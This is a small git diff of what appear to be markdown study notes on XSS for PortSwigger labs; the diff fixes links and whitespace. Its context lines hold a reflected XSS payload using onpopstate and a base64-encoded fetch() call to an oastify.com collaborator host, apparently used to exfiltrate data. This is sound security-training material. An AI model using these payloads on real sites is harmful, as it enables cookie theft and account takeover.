@@ -52,11 +52,12 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```JavaScript
 ?search=%22%3E%3Cbody%20onpopstate=print()>
 ```
-[onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate
+[onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
+[Methodology to identify allowed tags and events](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
 
 #### URL and Base64 online encoders and decoders  
-[URL Decode and Encode](https://www.urldecoder.org/) 
+[URL Decode and Encode](https://www.urldecoder.org/)  
 [BASE64 Decode and Encode](https://www.base64encode.org/)    
   
 ### Stored XSS
